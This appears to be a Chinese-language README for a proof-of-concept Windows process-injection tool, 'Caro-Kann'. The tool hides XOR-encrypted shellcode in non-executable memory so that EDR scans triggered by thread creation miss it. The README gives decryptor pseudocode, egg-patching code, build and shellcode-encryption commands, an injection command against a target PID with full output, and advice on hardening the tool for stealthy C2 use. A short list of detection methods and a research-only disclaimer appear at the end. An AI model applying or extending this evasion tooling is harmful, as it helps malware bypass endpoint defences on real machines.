# Caro-Kann Injection（加密 Shellcode 内存扫描规避注入）

## 技术概述

Caro-Kann 是一种高级的 shellcode 注入技术，通过**双重 shellcode** + **加密**的方式绕过内核层面的内存扫描。该技术由 S3cur3Th1sSh1t 开发，专门针对 EDR 厂商在内核回调（如 `PsSetCreateThreadNotifyRoutine`）时触发的内存扫描。

## 核心原理

### 传统注入的问题

当使用 `CreateRemoteThread` 或 `NtCreateThreadEx` 创建远程线程时，会触发内核回调：

```
CreateRemoteThread
    ↓
Kernel Callback (PsSetCreateThreadNotifyRoutine)
    ↓
EDR 触发内存扫描
    ↓
扫描所有 RWX/RX 内存
    ↓
检测到已知恶意 payload → 拦截！
```

### Caro-Kann 的解决方案

**核心思路**：分离 payload 和执行逻辑，使用加密隐藏恶意特征。

```
注入阶段：
├─ RW 内存：加密的恶意 payload（无可执行权限，无法被扫描为恶意）
└─ RX 内存：解密器 shellcode（自定义代码，无已知特征）

执行阶段：
1. 创建线程 → 内核扫描（只看到加密数据 + 解密器）
2. 解密器 Sleep（避开即时扫描）
3. XOR 解密 payload
4. VirtualProtect（RW → RX）
5. 直接跳转到解密后的 payload
```

## 技术细节

### 双重 Shellcode 架构

| Shellcode 类型 | 内存保护 | 内容 | 检测难度 |
|---------------|---------|------|---------|
| **Encrypted Payload** | RW (PAGE_READWRITE) | XOR 加密的恶意 payload | ❌ 无法执行，扫描器看不到原始特征 |
| **Decrypt Stub** | RX (PAGE_EXECUTE_READ) | 自定义解密器 | ❌ 无已知特征，看起来合法 |

### Decrypt Stub 执行流程

```c
void DecryptStub() {
    // 1. Sleep - 避开线程创建时的即时内存扫描
    Sleep(5000);  // 5 秒

    // 2. XOR 解密 encrypted payload
    XorDecrypt(encryptedPayloadAddr, payloadSize);

    // 3. 修改内存保护（RW → RX）
    VirtualProtect(encryptedPayloadAddr, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

    // 4. 跳转到解密后的 payload
    jmp encryptedPayloadAddr;  // 使用 trampoline: mov r10, addr; jmp r10
}
```

### Egg Hunting（占位符替换）

Decrypt Stub 是预编译的 shellcode，包含三个 "egg"（占位符），在运行时被主程序替换：

| Egg | 模式（Pattern） | 用途 | 值 |
|-----|----------------|------|-----|
| **Egg 1** | `0x88 * 8` | 加密 payload 的地址 | `payloadAddr` |
| **Egg 2** | `0xDEAD10AF` | Payload 的大小 | `payloadSize` |
| **Egg 3** | `0x00 * 8` (in trampoline) | 跳转地址 | `payloadAddr` |

**Egg 替换流程**：
```c
// 搜索 Egg 1: 0x88 * 8
for (i = 0; i < decryptStubSize; i++) {
    if (decryptStub[i..i+7] == 0x8888888888888888) {
        memcpy(&decryptStub[i], &payloadAddr, 8);  // 替换为真实地址
        break;
    }
}
```

## 执行流程图

```
[主程序]
    ↓
1. VirtualAllocEx(PAGE_READWRITE) → 分配 RW 内存
    ↓
2. WriteProcessMemory(加密 payload) → 写入加密数据
    ↓
3. 修补 Decrypt Stub 的 eggs
   ├─ Egg 1: 0x88 * 8 → payloadAddr
   ├─ Egg 2: 0xDEAD10AF → payloadSize
   └─ Egg 3: 0x00 * 8 → payloadAddr (jump)
    ↓
4. VirtualAllocEx(PAGE_EXECUTE_READ) → 分配 RX 内存
    ↓
5. WriteProcessMemory(Decrypt Stub) → 写入解密器
    ↓
6. CreateRemoteThread(Decrypt Stub) → 创建线程
    ↓
[内核回调触发内存扫描] ← EDR 只能看到：
    ├─ RW 内存：加密数据（无可执行权限，安全）
    └─ RX 内存：解密器（无恶意特征，安全）
    ↓
[Decrypt Stub 执行]
    ↓
7. Sleep(5000) → 避开即时扫描
    ↓
8. XorDecrypt(payloadAddr, payloadSize) → 解密
    ↓
9. VirtualProtect(RW → RX) → 修改保护
    ↓
10. jmp payloadAddr → 跳转执行 ✨
```

## 编译与使用

### Windows (build.bat)

```batch
build.bat
```

### Linux/Git Bash (build.sh)

```bash
chmod +x build.sh
./build.sh
```

### 生成 Shellcode

```cmd
cd build

# 生成原始 shellcode
generate_shellcode.exe calc

# 加密 shellcode
xor_encrypt.exe calc_shellcode.bin calc_encrypted.bin
```

**输出**：
```
[+] XOR Encryptor for Caro-Kann
[+] XOR Key: 0x04030201

[+] Loaded input file: 65 bytes
[+] Encrypted data using XOR key: 0x04030201
[+] Wrote encrypted file: 65 bytes
[+] Output: calc_encrypted.bin

[+] Encryption successful!
```

### 编译 Decrypt Stub（高级）

⚠️ **这是最复杂的部分**，需要编译 Position-Independent Code (PIC)。

**Linux (推荐)**：
```bash
# 编译为目标文件
gcc -c decrypt_stub.c -o decrypt_stub.o \
    -Wall -m64 -ffunction-sections \
    -fno-asynchronous-unwind-tables \
    -nostdlib -fno-ident -O2 \
    -Wl,--no-seh -masm=intel

# 链接为可执行文件
ld -s decrypt_stub.o -o decrypt_stub.exe

# 提取 .text 节
extract_stub.exe decrypt_stub.exe decrypt_stub.bin
```

**Windows (MinGW)**：
```cmd
# 使用相同的命令
gcc -c decrypt_stub.c -o decrypt_stub.o -Wall -m64 -ffunction-sections -fno-asynchronous-unwind-tables -nostdlib -fno-ident -O2 -Wl,--no-seh -masm=intel

ld -s decrypt_stub.o -o decrypt_stub.exe

extract_stub.exe decrypt_stub.exe decrypt_stub.bin
```

### 运行注入

```cmd
# 启动目标进程
start notepad

# 注入
caro_kann.exe 1234 calc_encrypted.bin decrypt_stub.bin
```

**输出示例**：
```
[+] Caro-Kann Injection POC
[+] Encrypted Shellcode Memory Scan Evasion
[+] Original Research: S3cur3Th1sSh1t

[+] Target PID: 1234
[+] Encrypted payload: calc_encrypted.bin
[+] Decrypt stub: decrypt_stub.bin
[+] Opened target process
[+] Loaded encrypted payload: 65 bytes
[+] Loaded decrypt stub: 512 bytes
[+] Allocated RW memory for encrypted payload at: 0000000002D40000
[+] Wrote encrypted payload (65 bytes) to RW memory
[!] Memory scan will only see encrypted payload in RW section

[*] Patching decrypt stub eggs...
[+] Found Payload Address Egg at offset: 0x5
[+] Patched Payload Address Egg with value: 0000000002D40000
[+] Found Payload Size Egg at offset: 0x12
[+] Patched Payload Size Egg with value: 00000041
[+] Found Jump Address Egg at offset: 0xA8
[+] Patched Jump Address with: 0000000002D40000

[+] Allocated RX memory for decrypt stub at: 0000000002E50000
[+] Wrote decrypt stub (512 bytes) to RX memory

[*] Creating remote thread on decrypt stub...
[!] Kernel callbacks may trigger memory scan now
[!] But they will only find:
[!]   - RW memory: Encrypted payload (no executable signature)
[!]   - RX memory: Decrypt stub (custom, non-malicious)

[+] Remote thread created successfully!
[+] Thread will execute decrypt stub, which will:
[+]   1. Sleep (avoid immediate memory scan)
[+]   2. Decrypt encrypted payload (XOR)
[+]   3. Change memory protection (RW -> RX)
[+]   4. Jump to decrypted payload

[+] Caro-Kann injection successful!
```

## 技术特点

| 特性 | 描述 |
|-----|------|
| ✅ 绕过内核内存扫描 | 扫描时只看到加密数据 + 解密器 |
| ✅ 双重 shellcode 架构 | 分离 payload 和执行逻辑 |
| ✅ XOR 加密 | 隐藏恶意特征 |
| ✅ Sleep 延迟 | 避开线程创建时的即时扫描 |
| ✅ RW/RX 分离 | Payload 在 RW，解密器在 RX |
| ✅ 无 Hook | 不修改任何系统函数 |
| ⚠️ 复杂实现 | 需要 PIC 编译、Egg hunting |
| ⚠️ 时间窗口 | Sleep 期间可能被检测 |

## OPSEC 改进建议

⚠️ **这是 POC，不可直接用于生产环境！**

### 必须修改的部分

1. **加密算法**
   - ❌ 当前使用简单 XOR
   - ✅ 使用 AES/RC4 等强加密
   - ✅ 动态生成密钥

2. **Sleep 时间**
   - ❌ 固定 5000ms
   - ✅ 动态随机化（3000-10000ms）
   - ✅ 使用 Sleep 加密（绕过内存扫描器）

3. **API 调用**
   - ❌ 解密器直接调用 Sleep/VirtualProtect
   - ✅ 使用 API hashing + 动态解析
   - ✅ 使用 Indirect Syscalls

4. **内存备份**
   - ✅ 建议使用 Module Stomping 将 payload 备份到合法 DLL
   - ✅ 使用 Threadless Injection 替代 CreateRemoteThread

5. **C2 Payload 改进**
   - ✅ 使用 Sleep 加密
   - ✅ 使用 Unhooking 或 Syscalls
   - ✅ 使用 Proxy Module Loading

## 防御检测方法

| 检测层面 | 方法 |
|---------|------|
| **行为检测** | 监控短时间内 VirtualProtect 修改内存保护（RW → RX） |
| **内存扫描** | 定期扫描所有内存（不仅在线程创建时） |
| **异常模式** | 检测 RW 内存在运行时变为 RX |
| **Sleep 检测** | Hook Sleep，检测可疑的长时间 Sleep |
| **解密特征** | 检测 XOR 循环模式 |

## 技术来源

- **原作者**: S3cur3Th1sSh1t
- **原仓库**: [S3cur3Th1sSh1t/Caro-Kann](https://github.com/S3cur3Th1sSh1t/Caro-Kann)
- **首次公开**: 2023 年
- **命名来源**: Caro-Kann Defense（国际象棋开局，以防守著称）

## 致谢

- [S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t) - 技术发现和实现
- [CyberArk](https://www.cyberark.com/) - 内存扫描绕过研究

## 参考链接

- [S3cur3Th1sSh1t Repository](https://github.com/S3cur3Th1sSh1t/Caro-Kann)
- [ETW Threat Intelligence](https://github.com/pathtofile/etwti)
- [Kernel Callbacks](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutine)

## 重要提示

1. **仅限研究和防御用途**
   - 此技术仅用于安全研究和防御目的
   - 不得用于恶意攻击

2. **编译复杂性**
   - Decrypt Stub 需要编译为 Position-Independent Code
   - 需要正确的 GCC/LD 编译选项
   - 建议使用 Linux/MinGW-w64 编译

3. **Egg 占位符**
   - 必须确保 Egg pattern 唯一
   - Egg 替换前验证模式匹配

4. **时间窗口**
   - Sleep 期间内存已解密
   - 可能被运行时内存扫描检测
   - 建议结合 Sleep 加密技术
